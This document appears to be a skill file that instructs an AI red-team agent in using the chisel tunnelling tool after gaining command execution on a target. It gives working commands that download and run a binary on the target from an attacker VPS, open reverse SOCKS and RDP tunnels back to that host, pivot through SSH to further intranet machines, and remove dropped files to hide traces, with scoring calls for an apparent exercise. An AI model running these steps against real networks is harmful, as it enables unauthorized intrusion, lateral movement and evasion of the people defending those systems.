---
name: chisel-tunnel
description: [Tunnel] chisel tunnel: a multiplexed tunnel wrapped in HTTP/WebSocket, the easiest way through egress restrictions and reverse proxies
whenToUse: When suo5 does not apply (no WebShell entry point), the target can only egress over HTTP, or port forwarding or a stable SOCKS is needed
role: internal
category: Tunnel
tags: [tunnel, http, socks5]
enabled: true
---

# chisel (HTTP tunnel / port forwarding)

> **Load the VPS config first**: every `$REDTEAM_VPS_HOST` / `$VPS_USER` in this skill comes from the local configuration,
> which is read from `$DSH_HOME/.env`. Source it once before each command:
> ```bash
> set -a; . "$DSH_HOME/.env" 2>/dev/null || . "$HOME/.dsh/.env"; set +a
> VPS_USER="${REDTEAM_VPS_USER:-ubuntu}"; VPS="$REDTEAM_VPS_HOST"
> ```
> Tools are prepared by the user; this skill provides no downloads, install scripts or tutorials.

`chisel` wraps TCP traffic inside **HTTP/WebSocket**, so it **passes most easily through egress policies and reverse proxies that only allow 80/443**.
Its division of labor with suo5:

| | suo5 | chisel |
| --- | --- | --- |
| Entry prerequisite | **Requires a WebShell** (HTTP channel) | **Only requires command execution** (just needs to run a binary) |
| Transport | HTTP long connection (disguised as normal requests) | HTTP/WebSocket (upgrade) |
| Strength | Enter the intranet from a Web entry point, reusable by users | Enter the intranet from a shell/RCE entry point; flexible port forwarding |
| Noise | Low (looks like ordinary Web requests) | Low to medium (WebSocket characteristics are somewhat more visible) |

**Selection rule**: with a WebShell → prefer `suo5-tunnel`; with only command execution/RCE or needing precise port forwarding → use chisel.

## Local binary

| File | Path |
| --- | --- |
| chisel (Linux amd64, same binary for server and client) | `$DSH_HOME/redteam/toolkit/chisel/chisel` (v1.12.0) |

Already synced to the VPS payload directory: `http://$REDTEAM_VPS_HOST:9100/` (the target can `curl` it directly).

## 1. Reverse SOCKS (most common: the target connects out to us)

```bash
# 1) Start the server on our VPS (run inside tmux so an SSH drop does not kill it)
tmux new -s chisel
$DSH_HOME/redteam/toolkit/chisel/chisel server -p 9443 --reverse --socks5
#    --reverse  allow clients to register reverse tunnels
#    --socks5   enable the built-in SOCKS5 (the port becomes usable once a client connects)
#    optional hardening: --auth user:pass   add auth so port scanners cannot freeload
#    optional disguise: --backend http://127.0.0.1:80  forward Web traffic to a local site

# 2) Start the client on the target side (via the existing RCE/command execution point; upload the binary first)
curl -s http://$REDTEAM_VPS_HOST:9100/chisel -o /tmp/c && chmod +x /tmp/c
/tmp/c client $REDTEAM_VPS_HOST:9443 R:socks
#    R:socks = reverse SOCKS; once connected, port 1080 on the VPS is the intranet SOCKS5 entry

# 3) Reach the intranet from this machine through the VPS SOCKS
proxychains4 -f runs/proxychains-1080.conf curl -s http://10.0.0.5/
#    runs/proxychains-1080.conf contains: socks5 $REDTEAM_VPS_HOST 1080
#    ⛔ Do not modify the system /etc/proxychains4.conf; use -f to point at a temporary config under runs/
```

## 2. Reverse port forwarding (expose an intranet port)

```bash
# Target side: map intranet 10.0.0.5:3389 to port 13389 on the VPS
/tmp/c client $REDTEAM_VPS_HOST:9443 R:13389:10.0.0.5:3389
# Local machine: connect directly to VPS:13389 and you are on intranet 3389
rdesktop $REDTEAM_VPS_HOST:13389
```

## 3. Forward SOCKS (the target can reach us directly, but we must actively connect into the target's intranet)

```bash
# Start the server on the target side
/tmp/c server -p 9443 --socks5
# Start the client on our side for local forwarding
chisel client <target>:9443 1080:socks
# Afterwards point proxychains at 127.0.0.1:1080
```

## 4. Multi-hop / chaining

```bash
# Existing tunnel A (suo5 → 127.0.0.1:1080); start chisel on intranet host B through A
proxychains4 -f runs/proxychains-1080.conf \
  ssh user@10.0.0.6 "curl -s http://$REDTEAM_VPS_HOST:9100/chisel -o /tmp/c && chmod +x /tmp/c && nohup /tmp/c client $REDTEAM_VPS_HOST:9443 R:socks2 &"
# Expand reachability hop by hop; register the tunnel and reachable segments at every layer
```

## 5. Discipline and self-preservation

1. **Must run under tmux / nohup**: the tunnel dies with the session (`nohup ... &` or `tmux`).
2. **Add auth to the server**: a chisel server on a public VPS gets port-scanned; add `--auth user:pass` and `pkill` it when done.
3. **Port selection**: avoid 80/443 (may be taken by other services on the VPS); use high ports such as 9443/8443;
   **the VPS security group must allow them**.
4. **Clean up traces and files dropped on the target side**: `/tmp/c` can be deleted after use; do not place binaries in obviously characteristic paths.
5. **Do not pass off a proxy on our own VPS as a "breakthrough"**: the tunnel's `entry_kind` must honestly describe the target-side leg (see below).

## 6. Output and persistence (mandatory)

1. **Register the tunnel with `redteam_tunnel_add`**, with every field filled:
   - `kind`: `chisel`;
   - `listen`: **the listen address the user can actually use** (e.g. `$REDTEAM_VPS_HOST:1080` or `127.0.0.1:1080`);
   - `entry`: the target-side entry point (e.g. `/tmp/c client on 10.0.0.6 → VPS:9443`);
   - `reach`: **reachable segments** (e.g. `10.0.0.0/24`, filled in after actual testing — do not guess);
   - `entry_kind`: **must be `target-outbound`** (target call-back / chisel client running on the target) or
     `target-http` (through the target's WebShell), `target-agent` (through an already-controlled process on the target);
     ⛔ Opening a proxy only on your own VPS must be filled as `self-only` — **it will be marked "not a breakthrough"**;
   - `command`: the full verbatim command (both the server and client segments).
2. **Verify connectivity for real**: `curl --socks5-hostname <listen> http://<intranet target>/` or `proxychains4 -f ... curl ...`;
   the tunnel only counts once traffic flows; then write the status back with `redteam_session_check`.
3. **Scoring**: tunnel reaches the intranet → `redteam_score_hit` (`boundary`, evidence reads "tunnel address | reachable segments | intranet target actually reached");
   lateral movement to other hosts through it → `server-host`.
4. **Hand off to the user**: provide a directly pasteable configuration — `socks5://<listen>` (or how to map it to the user's machine via `ssh -D` / frp),
   state the listen address and port clearly, and note that the tunnel crosses the target boundary.
5. When scoring, put the actual command/output into `redteam_score_hit`'s `command`/`result`; no separate chain write-up is needed.
